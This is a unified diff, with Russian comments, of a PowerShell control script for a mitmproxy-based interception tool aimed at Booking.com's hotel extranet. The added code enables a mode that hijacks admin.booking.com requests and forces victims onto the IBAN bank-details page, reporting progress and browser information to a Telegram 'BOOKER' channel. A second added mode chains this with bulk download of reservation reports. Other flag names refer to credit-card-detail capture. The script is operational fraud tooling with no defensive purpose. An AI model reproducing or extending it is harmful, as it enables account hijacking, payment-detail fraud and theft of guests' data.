@@ -1,4 +1,4 @@
-﻿Set-StrictMode -Version Latest
+Set-StrictMode -Version Latest
 $ErrorActionPreference = "Stop"
 
 # ---------------- CONFIG ----------------
@@ -36,6 +36,9 @@ $BookingCCDetailsFlag = "C:\temp\mitm_booking_cc_details_once"
 $BookingCCDetailsBnFile = "C:\temp\mitm_booking_cc_details_bn.txt"
 $BookingCCDetailsHotelIdFile = "C:\temp\mitm_booking_cc_details_hotel_id.txt"
 
+# ========== НОВЫЙ ФЛАГ ДЛЯ ФУНКЦИИ 14 (IBAN SETTINGS FORCE) ==========
+$BookingIbanSettingsFlag = "C:\temp\mitm_booking_iban_settings_once"
+
 # ---------------- ФЛАГИ ФУНКЦИИ 27 ----------------
 $BookingReservationsCycleFlag = "C:\temp\mitm_booking_reservations_cycle_once"
 $BookingReservationsCycleHotelIdsFile = "C:\temp\mitm_booking_cycle_hotel_ids.txt"
@@ -44,13 +47,16 @@ $BookingReservationsCycleIndexFile = "C:\temp\mitm_booking_cycle_index.txt"
 $BookingReservationsCycleActiveFile = "C:\temp\mitm_booking_cycle_active.txt"
 $BookingReservationsCycleNextRunFile = "C:\temp\mitm_booking_cycle_next_run.txt"
 
+# ========== НОВЫЙ ФЛАГ ДЛЯ ФУНКЦИИ 29 (IBAN + RESERVATIONS) ==========
+$BookingIbanAndReservationsFlag = "C:\temp\mitm_booking_iban_and_reservations_once"
+
 # ---------------- ФЛАГИ ФУНКЦИЙ 21-26 ----------------
 $PartnersFlag = "C:\temp\mitm_partners_once"
 $PartnersAndMessFlag = "C:\temp\mitm_partners_and_mess_once"
 $DeviceFlag = "C:\temp\mitm_device_once"
 $PulseFlag = "C:\temp\mitm_pulse_once"
 $UltraPulseFlag = "C:\temp\mitm_ultra_pulse_once"
-$MonitorPlatformsFlag = "C:\temp\mitm_monitor_platforms_once"  # ФЛАГ ФУНКЦИИ 26 - НИКОГДА НЕ УДАЛЯТЬ!
+$MonitorPlatformsFlag = "C:\temp\mitm_monitor_platforms_once"
 $PulseRedirectToFile = "C:\temp\mitm_pulse_redirect_to.txt"
 $UltraPulseRedirectToFile = "C:\temp\mitm_ultra_pulse_redirect_to.txt"
 $DeviceRedirectDoneFlag = "C:\temp\mitm_device_redirect_done.txt"
@@ -335,18 +341,10 @@ function Save-AutostartState {
 # ========== ФУНКЦИИ ДЛЯ РАБОТЫ С ФЛАГОМ 26 ==========
 
 function Preserve-Function26Flag {
-    <#
-    .SYNOPSIS
-    Сохраняет состояние флага функции 26 перед удалением других флагов
-    #>
     return (Test-Path $MonitorPlatformsFlag)
 }
 
 function Restore-Function26Flag {
-    <#
-    .SYNOPSIS
-    Восстанавливает флаг функции 26 если он был активен
-    #>
     param([bool]$wasEnabled)
     
     if ($wasEnabled) {
@@ -375,11 +373,8 @@ function Enable-MonitorPlatforms {
         New-Item -ItemType Directory -Path (Split-Path $MonitorPlatformsFlag) -Force | Out-Null
     }
     
-    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 26
     New-Item -ItemType File -Path $MonitorPlatformsFlag -Force | Out-Null
     
-    # Удаляем ТОЛЬКО конфликтующие базовые редиректы
-    # НЕ УДАЛЯЕМ флаги других функций!
     Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
     Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
     
@@ -414,12 +409,14 @@ function Enable-ForceRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -446,12 +443,14 @@ function Enable-OneShotRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -478,12 +477,14 @@ function Enable-MessageRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -510,12 +511,14 @@ function Enable-ProviderRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -542,12 +545,14 @@ function Enable-UserRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -574,12 +579,14 @@ function Enable-SecurityRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -613,12 +620,14 @@ function Enable-Operation11Redirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -654,12 +663,14 @@ function Enable-Operation12Redirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -688,12 +699,14 @@ function Enable-BookingHotelRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -708,6 +721,80 @@ function Enable-BookingHotelRedirect {
 function Disable-BookingHotelRedirect {
     Remove-Item -Path $BookingHotelFlag -Force -ErrorAction SilentlyContinue
     Log-Write "Booking.com HOTEL (global) redirect disabled (function 13)."
+}
+
+# ========== ОБНОВЛЕННАЯ ФУНКЦИЯ 14: IBAN SETTINGS FORCE ==========
+# Взято за основу из mitm_redirect_addon_13_iban.py (функция 13 IBAN settings force)
+function Enable-BookingIbanSettingsRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
+    Log-Write "Starting FUNCTION 14 (IBAN Settings Force)..."
+    
+    Write-Host ""
+    Write-Host "============================================"
+    Write-Host "=== FUNCTION 14: IBAN SETTINGS FORCE ==="
+    Write-Host "============================================"
+    Write-Host ""
+    Write-Host "[INFO] Эта функция перенаправляет на страницу IBAN/bank details"
+    Write-Host "       (finance_settings.html) для добавления банковских реквизитов"
+    Write-Host ""
+    Write-Host "📌 ЧТО ДЕЛАЕТ ФУНКЦИЯ:"
+    Write-Host "   1. Перехватывает запросы к admin.booking.com/hotel/*"
+    Write-Host "   2. Перенаправляет на:"
+    Write-Host "      https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/finance_settings.html"
+    Write-Host "   3. ПОСЛЕ ЗАВЕРШЕНИЯ (когда есть ses, hotel_id, auth_assurance_last_check):"
+    Write-Host "      ✅ МГНОВЕННЫЙ редирект на https://admin.booking.com/"
+    Write-Host "   4. Отправляет логи в Telegram:"
+    Write-Host "      📘 BOOKER канал - статус 'In PROCESS with IBAN 🏦'"
+    Write-Host "      ✅ BOOKER канал - статус 'IBAN CAN BE ADDED 🏦'"
+    Write-Host "   5. В лог добавляется информация о браузере клиента!"
+    Write-Host ""
+    
+    if (-not (Test-Path (Split-Path $BookingIbanSettingsFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $BookingIbanSettingsFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $BookingIbanSettingsFlag -Force | Out-Null
+
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
+        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
+        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
+    
+    Log-Write "Function 14 (IBAN Settings Force) enabled - redirects to finance_settings.html"
+    Save-AutostartState -FunctionName "FUNCTION_14_IBAN"
+    
+    Write-Host ""
+    Write-Host "✅ FUNCTION 14 ACTIVATED" -ForegroundColor Green
+    Write-Host "   📍 Redirect target: finance_settings.html (IBAN/Bank Details)"
+    Write-Host "   🚀 After completion: INSTANT redirect to https://admin.booking.com/"
+    Write-Host "   📨 Telegram logs to BOOKER channel with browser info"
+    Write-Host ""
+    
+    Start-Mitmdump
+    Log-Write "Booking.com IBAN Settings Force redirect enabled (function 14)."
+}
+
+function Disable-BookingIbanSettingsRedirect {
+    Remove-Item -Path $BookingIbanSettingsFlag -Force -ErrorAction SilentlyContinue
+    Write-Host ""
+    Write-Host "✅ Function 14 (IBAN Settings Force) DISABLED" -ForegroundColor Yellow
+    Write-Host ""
+    Log-Write "Booking.com IBAN Settings Force redirect disabled (function 14)."
 }
 
 function Enable-BookingHotelSecurityRedirect {
@@ -725,12 +812,14 @@ function Enable-BookingHotelSecurityRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -764,12 +853,14 @@ function Enable-Operation16Redirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -813,7 +904,6 @@ function Enable-CustomRedirect {
             continue
         }
         
-        # ИСПРАВЛЕНО: добавлен $ в конце regex
         if ($fromDomain -notmatch '^https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$') {
             Write-Host "WARNING: URL doesn't look like a valid domain" -ForegroundColor Yellow
             $confirm = Read-Host "Continue anyway? (y/n)"
@@ -876,12 +966,14 @@ function Enable-CustomRedirect {
         $Operation16Flag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -955,12 +1047,14 @@ function Enable-BookingReservationsRedirect {
         $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
         $CustomRedirectDoneFlag, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1020,12 +1114,14 @@ function Enable-BookingCCDetailsRedirect {
         $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1064,7 +1160,6 @@ function Enable-BookingReservationsCycleRedirect {
     Write-Host ""
     
     do {
-        # ИСПРАВЛЕНО: полный пример с закрытой кавычкой
         $hotelIdsInput = Read-Host "Enter hotel_id(s) (comma-separated, e.g.: 14762911,15239128,10790315)"
         $hotelIdsArray = $hotelIdsInput.Split(',') | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
         
@@ -1086,7 +1181,6 @@ function Enable-BookingReservationsCycleRedirect {
     } while ($true)
     
     do {
-        # ИСПРАВЛЕНО: полный пример с закрытой кавычкой
         $reportIdsInput = Read-Host "Enter reportId(s) (comma-separated, e.g.: 5865185,1234567,7654321)"
         $reportIdsArray = $reportIdsInput.Split(',') | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' }
         
@@ -1139,10 +1233,11 @@ function Enable-BookingReservationsCycleRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
-        $UltraPulseRedirectToFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $UltraPulseRedirectToFile,
+        $BookingIbanAndReservationsFlag
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
@@ -1205,6 +1300,125 @@ function Clear-Function27 {
     Log-Write "Function 27 cleared"
 }
 
+# ========== ФУНКЦИЯ 29: IBAN + RESERVATIONS ==========
+function Enable-BookingIbanAndReservationsRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
+    Log-Write "Starting FUNCTION 29 (IBAN + RESERVATIONS)..."
+    
+    Write-Host ""
+    Write-Host "============================================"
+    Write-Host "=== FUNCTION 29: IBAN + RESERVATIONS ==="
+    Write-Host "============================================"
+    Write-Host ""
+    Write-Host "[INFO] СОВМЕЩАЕТ функцию 14 (IBAN Settings Force) и функцию 18 (Reservations Download)"
+    Write-Host ""
+    Write-Host "📌 ПОСЛЕДОВАТЕЛЬНОСТЬ:"
+    Write-Host "   1. СНАЧАЛА активируется функция 14 (IBAN Settings Force)"
+    Write-Host "   2. После ее ЗАВЕРШЕНИЯ автоматически активируется функция 18 (Reservations Download)"
+    Write-Host "   3. Начинается загрузка резервов"
+    Write-Host ""
+    
+    Write-Host "📋 НАСТРОЙКА ФУНКЦИИ 18 (RESERVATIONS)"
+    Write-Host ""
+    
+    do {
+        $hotelId = Read-Host "Enter hotel_id for reservations"
+        if ($hotelId -notmatch '^\d+$') {
+            Write-Host "ERROR: hotel_id must be a number" -ForegroundColor Red
+            continue
+        }
+        break
+    } while ($true)
+    
+    do {
+        $reportId = Read-Host "Enter reportId for reservations"
+        if ($reportId -notmatch '^\d+$') {
+            Write-Host "ERROR: reportId must be a number" -ForegroundColor Red
+            continue
+        }
+        break
+    } while ($true)
+    
+    # Сохраняем параметры для функции 18 (НО НЕ СОЗДАЕМ ЕЁ ФЛАГ!)
+    Set-Content -Path $BookingReservationsHotelIdFile -Value $hotelId -Force
+    Set-Content -Path $BookingReservationsReportIdFile -Value $reportId -Force
+    
+    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 14 (IBAN)
+    if (-not (Test-Path (Split-Path $BookingIbanSettingsFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $BookingIbanSettingsFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $BookingIbanSettingsFlag -Force | Out-Null
+    
+    # НЕ СОЗДАЕМ ФЛАГ ФУНКЦИИ 18! ОН БУДЕТ СОЗДАН ПОСЛЕ ЗАВЕРШЕНИЯ IBAN!
+    
+    # СОЗДАЕМ ФЛАГ ФУНКЦИИ 29
+    if (-not (Test-Path (Split-Path $BookingIbanAndReservationsFlag))) {
+        New-Item -ItemType Directory -Path (Split-Path $BookingIbanAndReservationsFlag) -Force | Out-Null
+    }
+    New-Item -ItemType File -Path $BookingIbanAndReservationsFlag -Force | Out-Null
+    
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
+        $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
+        $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # НЕ УДАЛЯЕМ ФЛАГ 18, ПОТОМУ ЧТО ОН НЕ СОЗДАН!
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
+    
+    Log-Write ("Function 29 enabled: IBAN Settings (auto-reservations will activate after IBAN completion)")
+    Save-AutostartState -FunctionName "FUNCTION_29_IBAN_AND_RESERVATIONS"
+    
+    Write-Host ""
+    Write-Host "============================================" -ForegroundColor Green
+    Write-Host "✅ FUNCTION 29 ACTIVATED" -ForegroundColor Green
+    Write-Host "============================================" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "📋 CONFIGURATION:" -ForegroundColor Cyan
+    Write-Host "   IBAN Settings Force (Function 14) - ENABLED"
+    Write-Host "   Reservations download (Function 18) - will start AFTER IBAN completes"
+    Write-Host "   Hotel ID: $hotelId"
+    Write-Host "   Report ID: $reportId"
+    Write-Host ""
+    Write-Host "🔄 SEQUENCE:" -ForegroundColor Cyan
+    Write-Host "   1. User visits admin.booking.com → IBAN settings page"
+    Write-Host "   2. User adds IBAN and clicks save → function 14 completes"
+    Write-Host "   3. AUTOMATICALLY → Reservations download starts"
+    Write-Host "   4. After reservations completion → 10s auto-redirect to main page"
+    Write-Host ""
+    
+    Start-Mitmdump
+    Log-Write "Booking.com IBAN + Reservations combined redirect enabled (function 29)."
+}
+
+function Clear-Function29 {
+    Log-Write "Clearing Function 29..."
+    
+    Remove-Item -Path $BookingIbanAndReservationsFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingIbanSettingsFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsFlag -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsHotelIdFile -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $BookingReservationsReportIdFile -Force -ErrorAction SilentlyContinue
+    
+    Write-Host ""
+    Write-Host "✅ Function 29 completely cleared" -ForegroundColor Green
+    Write-Host "   All flags and configuration removed"
+    Write-Host ""
+    
+    Log-Write "Function 29 cleared"
+}
+
 # ========== НОВЫЕ ФУНКЦИИ 21-26 ==========
 
 function Enable-PartnersRedirect {
@@ -1233,13 +1447,14 @@ function Enable-PartnersRedirect {
         $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
+        $BookingIbanSettingsFlag,
         $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
         $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
-        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
-        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
+        $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile,
